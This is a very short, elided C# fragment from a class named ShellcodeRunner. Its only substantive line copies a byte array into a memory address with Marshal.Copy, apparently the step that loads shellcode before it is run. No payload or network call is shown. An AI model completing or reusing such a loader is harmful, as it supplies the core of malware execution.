...
namespace ShellcodeRunner
{
    public class Program
    {
        ...
        public static void Run()
        {
            ...
            Marshal.Copy(amit, 0, addr, amit.Length);
